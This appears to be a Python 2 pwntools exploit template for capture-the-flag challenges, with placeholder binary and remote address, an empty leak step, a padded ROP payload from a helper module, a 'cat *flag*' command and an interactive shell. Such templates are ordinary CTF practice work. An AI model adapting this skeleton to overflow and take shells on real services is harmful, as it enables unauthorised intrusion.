#!/usr/bin/env python2
import sys
sys.path.insert(0, "/mnt")

import speed
import re
from pwn import *

context.binary = "BINARY"

### Interact functions ###

##########################

if args.LOCAL:
    p = process(context.binary.path)
    raw_input('\n'.join([
        '',
        'attach {}'.format(p.pid),
        'continue',
        '',
        '[ENTER]'
        ]))

else:
    p = remote("IPADDR", 9090)

# LEAK
# stuff here...

leaked_addr = 0 # replace with actual leakage

#speed.libc_base_from_symbol("symbol", leaked_addr)
#speed.libc_base_from_unsorted_bin(leaked_addr)
#speed.libc_base(libc_base_manual)


# EXPLOIT
rop_payload = 'A'*100 + speed.rop_autowin()
p.sendline(rop_payload)

p.sendline("cat *flag*")
possible_flag = p.recv(timeout=1)
print possible_flag
print ""
print re.findall(r'OOO{.+}', possible_flag)

p.interactive()
